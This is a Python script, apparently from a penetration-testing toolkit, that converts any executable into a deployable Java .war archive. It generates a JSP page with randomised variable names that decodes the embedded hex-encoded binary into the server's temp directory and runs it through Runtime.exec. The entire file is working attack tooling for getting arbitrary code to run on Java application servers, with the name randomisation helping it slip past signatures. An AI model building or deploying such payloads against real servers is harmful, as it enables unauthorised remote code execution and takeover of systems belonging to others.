#!/usr/bin/python

# This script is designed to take an executable and create a .war file
# This is obviously used for pentesting purposes and executing arbitrary .exe files
# All research came from the awesome metasploit project - 99% of the code logic was from metasploit
# Link to their payload generation is here - https://github.com/rapid7/metasploit-framework/blob/d483f2ad79754b3353ed18784e97bbe6c1489b0b/lib/rex/zip/samples/mkwar.rb

import argparse
from binascii import hexlify
import zipfile
import random
import string
import os
import sys

# Code used from our Veil Project to generate random characters
def randomString(length=-1):
    """
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in between 6 and 15 characters.
    """
    if length == -1: length = random.randrange(6,16)
    random_string = ''.join(random.choice(string.ascii_letters) for x in range(length))
    return random_string

# Command line argument parser
parser = argparse.ArgumentParser(description="Convert your executable into a .war file.")
parser.add_argument("-exe", help="Path to the .exe you wish to convert to a .war file")
parser.add_argument("-out", help="Output path of .war file")
args = parser.parse_args()

# Quick error checking
if not args.exe:
    print "You didn't give me an executable via the CLI..."
    sys.exit()

if not args.out:
    print "You didn't provide an output path for the .war file..."
    sys.exit()

# Set up all our variables
var_hexpath = randomString()
var_exepath = randomString()
var_data = randomString()
var_inputstream = randomString()
var_outputstream = randomString()
var_numbytes = randomString()
var_bytearray = randomString()
var_bytes = randomString()
var_counter = randomString()
var_char1 = randomString()
var_char2 = randomString()
var_comb = randomString()
var_exe = randomString()
var_hexfile = randomString()
var_proc = randomString()
var_name = randomString()
var_payload = randomString()

# text file containing the executable
try:
    raw = open(args.exe, 'rb').read()
    txt_exe = hexlify(raw)
    txt_payload_file = open(var_hexfile + ".txt", 'w')
    txt_payload_file.write(txt_exe)
    txt_payload_file.close()
except IOError:
    print "ERROR: You didn't provide the path to an executable"
    sys.exit()

# Set up our JSP files used for triggering the payload within the war file
jsp_payload =  "<%@ page import=\"java.io.*\" %>\n"
jsp_payload += "<%\n"
jsp_payload += "String " + var_hexpath + " = application.getRealPath(\"/\") + \"" + var_hexfile + ".txt\";\n"
jsp_payload += "String " + var_exepath + " = System.getProperty(\"java.io.tmpdir\") + \"/" + var_exe + "\";\n"
jsp_payload += "String " + var_data + " = \"\";\n"
jsp_payload += "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
jsp_payload += var_exepath + " = " + var_exepath + ".concat(\".exe\");\n"
jsp_payload += "}\n"
jsp_payload += "FileInputStream " + var_inputstream + " = new FileInputStream(" + var_hexpath + ");\n"
jsp_payload += "FileOutputStream " + var_outputstream + " = new FileOutputStream(" + var_exepath + ");\n"
jsp_payload += "int " + var_numbytes + " = " + var_inputstream + ".available();\n"
jsp_payload += "byte " + var_bytearray + "[] = new byte[" + var_numbytes + "];\n"
jsp_payload += var_inputstream + ".read(" + var_bytearray + ");\n"
jsp_payload += var_inputstream + ".close();\n"
jsp_payload += "byte[] " + var_bytes + " = new byte[" + var_numbytes + "/2];\n"
jsp_payload += "for (int " + var_counter + " = 0; " + var_counter + " < " + var_numbytes + "; " + var_counter + " += 2)\n"
jsp_payload += "{\n"
jsp_payload += "char " + var_char1 + " = (char) " + var_bytearray + "[" + var_counter + "];\n"
jsp_payload += "char " + var_char2 + " = (char) " + var_bytearray + "[" + var_counter+ " + 1];\n"
jsp_payload += "int " + var_comb + " = Character.digit(" + var_char1 + ", 16) & 0xff;\n"
jsp_payload += var_comb + " <<= 4;\n"
jsp_payload += var_comb + " += Character.digit(" + var_char2 + ", 16) & 0xff;\n"
jsp_payload += var_bytes + "[" + var_counter + "/2] = (byte)" + var_comb + ";\n"
jsp_payload += "}\n"
jsp_payload += var_outputstream + ".write(" + var_bytes + ");\n"
jsp_payload += var_outputstream + ".close();\n"
jsp_payload += "Process " + var_proc + " = Runtime.getRuntime().exec(" + var_exepath + ");\n"
jsp_payload += "%>\n"

jsp_file_out = open(var_payload + ".jsp", 'w')
jsp_file_out.write(jsp_payload)
jsp_file_out.close()

# MANIFEST.MF file contents
manifest_file = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
man_file = open("MANIFEST.MF", 'w')
man_file.write(manifest_file)
man_file.close()

# web.xml file contents
web_xml_contents = "<?xml version=\"1.0\"?>\n"
web_xml_contents += "<!DOCTYPE web-app PUBLIC\n"
web_xml_contents += "\"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n"
web_xml_contents += "\"http://java.sun.com/dtd/web-app_2_3.dtd\">\n"
web_xml_contents += "<web-app>\n"
web_xml_contents += "<servlet>\n"
web_xml_contents += "<servlet-name>" + var_name + "</servlet-name>\n"
web_xml_contents += "<jsp-file>/" + var_payload + ".jsp</jsp-file>\n"
web_xml_contents += "</servlet>\n"
web_xml_contents += "</web-app>\n"

# Create our web.xml files
xml_file = open("web.xml", 'w')
xml_file.write(web_xml_contents)
xml_file.close()

# Create our directories needed for the war file
os.system("mkdir META-INF")
os.system("mkdir WEB-INF")
os.system("mv web.xml WEB-INF/")
os.system("mv MANIFEST.MF META-INF/")

# Make the war file by zipping everything together
# Some ideas from - http://stackoverflow.com/questions/458436/adding-folders-to-a-zip-file-using-python
myZipFile = zipfile.ZipFile(args.out, "w" )
myZipFile.write(var_payload + ".jsp", var_payload + ".jsp", zipfile.ZIP_DEFLATED)
myZipFile.write(var_hexfile + ".txt", var_hexfile + ".txt", zipfile.ZIP_DEFLATED)
myZipFile.write("META-INF/MANIFEST.MF", "META-INF/MANIFEST.MF", zipfile.ZIP_DEFLATED)
myZipFile.write("WEB-INF/web.xml", "WEB-INF/web.xml", zipfile.ZIP_DEFLATED)
myZipFile.close()

# Clean up the individual files, you can always unzip the war to see them again
os.system("rm -rf WEB-INF")
os.system("rm -rf META-INF")
os.system("rm " + var_payload + ".jsp")
os.system("rm " + var_hexfile + ".txt")